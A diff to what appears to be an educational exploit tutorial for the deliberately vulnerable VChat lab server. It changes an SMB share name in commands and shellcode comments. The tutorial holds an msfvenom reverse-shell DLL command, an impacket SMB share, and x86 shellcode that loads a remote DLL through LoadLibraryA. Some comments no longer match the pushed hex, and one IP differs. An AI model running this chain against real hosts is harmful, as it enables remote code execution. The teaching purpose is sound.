@@ -360,9 +360,9 @@ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.15 
 * `-f`: The output format.
     * `dll`: Format for use as a DLL.
 
-Now we know from the [UNC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc) datatype that we have to provide a string in the form `= "\\" host-name "\" share-name  [ "\" object-name ]` when attempting to load and attach a DLL to our process. In our case, this could be something like `\\10.0.2.15\ABCD\mal.dll` where `10.0.2.15` is the IP of the Kali, `A` is the name of our SMB share and `mal.dll` is the malicious DLL object we are sharing. We can generate an SMB share using the following command: This should be run in the directory that contains the malicious DLL `mal.dll`.
+Now we know from the [UNC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc) datatype that we have to provide a string in the form `= "\\" host-name "\" share-name  [ "\" object-name ]` when attempting to load and attach a DLL to our process. In our case, this could be something like `\\10.0.2.15\abcd\mal.dll` where `10.0.2.15` is the IP of the Kali, `A` is the name of our SMB share and `mal.dll` is the malicious DLL object we are sharing. We can generate an SMB share using the following command: This should be run in the directory that contains the malicious DLL `mal.dll`.
 ```
-sudo impacket-smbserver -smb2support ABCD .
+sudo impacket-smbserver -smb2support abcd .
 ```
 * `sudo`: This command and operation require root privileges to bind to the well-known SMB port 445.
 * [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver):  This is the command the launches a SMB server and add a share as specified.
@@ -384,19 +384,19 @@ HMODULE LoadLibraryA(
 * `LPCSTR lpLibFileName`: This is a string specifying the DLL to be loaded, this can be a UNC path.
 * This will return the handle to the module if it succeeds. Otherwise, it will be NULL.
 
-The string we need to push on the stack is `\\10.0.2.15\ABCD\mal.dll` as was discussed in the [Malicious DLLs](#malicious-dlls) section earlier. As we are working with a 32-bit system, we need to split this string of 24 bytes (23 chars + 1 NULL) into 4-byte chunks for the optimal PUSH operations onto the stack. The [original blog](https://fluidattacks.com/blog/vulnserver-kstet-alternative/) provides the following shell script.
+The string we need to push on the stack is `\\10.0.2.15\abcd\mal.dll` as was discussed in the [Malicious DLLs](#malicious-dlls) section earlier. As we are working with a 32-bit system, we need to split this string of 24 bytes (23 chars + 1 NULL) into 4-byte chunks for the optimal PUSH operations onto the stack. The [original blog](https://fluidattacks.com/blog/vulnserver-kstet-alternative/) provides the following shell script.
 
 ```sh
-$ for i in $(echo -ne '\\\\10.0.2.15\\ABCD\\mal.dll' | xxd -ps | tr -d '\n' | fold -w 8); do python3 -c "import struct;print(struct.pack('<L', 0x$i).hex())"; done | tac | sed 's/^/push 0x/g'
+$ for i in $(echo -ne '\\\\10.0.2.15\\abcd\\mal.dll' | xxd -ps | tr -d '\n' | fold -w 8); do python3 -c "import struct;print(struct.pack('<L', 0x$i).hex())"; done | tac | sed 's/^/push 0x/g'
 ```
 To more easily explain this I will be breaking this up below:
 
 
 First, we will look at the conditional expression of the for loop.
 ```sh
-$(echo -ne '\\\\10.0.2.15\\ABCD\\mal.dll' | xxd -ps | tr -d '\n' | fold -w 8)
+$(echo -ne '\\\\10.0.2.15\\abcd\\mal.dll' | xxd -ps | tr -d '\n' | fold -w 8)
 ```
-* [`echo -ne '\\\\10.0.2.15\\ABCD\\mal.dll'`](https://www.man7.org/linux/man-pages/man1/echo.1.html): This will print "\\\\10.0.2.15\ABCD\mal.dll" to the standard output.
+* [`echo -ne '\\\\10.0.2.15\\abcd\\mal.dll'`](https://www.man7.org/linux/man-pages/man1/echo.1.html): This will print "\\\\10.0.2.15\abcd\mal.dll" to the standard output.
 	* `-n`: Do not print the newline character.
 	* `-e`: Evaluate escape characters (Ex. \n \e \t...).
 * [`| xxd -ps`](https://linux.die.net/man/1/xxd): Pipe the output of the *echo* command into the stdin of *xxd* which takes the input and converts the stdin values to their equivalent hexadecimal output.
@@ -449,7 +449,7 @@ Now we can see what happens to all the resulting stdout values after the loop ha
 	```
 	* **Notice**: Our first push instruction contains the bad character `0x00`; rather than using an encoder I will simply add three characters to the SMB share's identifier to pad it out as shown below:
 		```sh
-		$ for i in $(echo -ne '\\\\10.0.2.15\\ABCD\\mal.dll' | xxd -ps | tr -d '\n' | fold -w 8); do python3 -c "import struct;print(struct.pack('<L', 0x$i).hex())"; done | tac | sed 's/^/push 0x/g'
+		$ for i in $(echo -ne '\\\\10.0.2.15\\abcd\\mal.dll' | xxd -ps | tr -d '\n' | fold -w 8); do python3 -c "import struct;print(struct.pack('<L', 0x$i).hex())"; done | tac | sed 's/^/push 0x/g'
 		```
 
 4. Now we can push the arguments `LoadLibraryA` uses onto the stack, including a pointer to the UNC string which we have just finished inserting onto the stack.
@@ -562,7 +562,7 @@ Now we have everything we need to exploit the VChat server using the DLL sideloa
 
 4. If the SMB share has not been started, navigate to where your malicious DLL is located and start it.
 	```
-	$ sudo impacket-smbserver -smb2support ABCD .
+	sudo impacket-smbserver -smb2support abcd .
 	```
 	* `sudo`: This command and operation requires root privileges to bind to the well-known SMB port 445.
 	* [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver):  This is the command the launches a SMB server and add a share as specified.
@@ -684,7 +684,7 @@ sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
 xor ebx,ebx             ; Zero out EBX that will be the NULL byte terminating
                         ; the UNC path
 push ebx                ; PUSH NULL byte
-push 0x6c6c642e         ; \\10.0.2.15\ABCD\mal.dll reversed
+push 0x6c6c642e         ; \\10.0.2.15\abcd\mal.dll reversed
 push 0x6c616d5c
 push 0x44434241
 push 0x5c35312e
@@ -692,7 +692,7 @@ push 0x322e302e
 push 0x30315c5c
 push esp                ; Push pointer of the UNC path
 mov ebx,0x76ba12a0      ; Move into EBX the address of 'LoadLibraryA'
-call ebx                ; call 'LoadLibraryA("\\10.0.2.15\ABCD\mal.dll")'
+call ebx                ; call 'LoadLibraryA("\\10.0.2.15\abcd\mal.dll")'
 ```
 
 We first adjust the stack pointer stored in the `ESP` register: `sub esp,0x64`. This is done to prevent the setup of the function call and any later calls made by LoadLibraryA from overwriting our shellcode. However, this is not too much of a concern here, as once we finish with the LoadLibraryA call, we are not too concerned with what happens in this thread.
@@ -706,7 +706,7 @@ Finally we put the address of the LoadLibrayA function as found by Arwin into th
 ## Note
 In a terminal on Windows,
 ```
-rundll32 \\10.0.2.25\ABCD\mal.dll, xyz
+rundll32 \\10.0.2.25\abcd\mal.dll, xyz
 ```
 
 
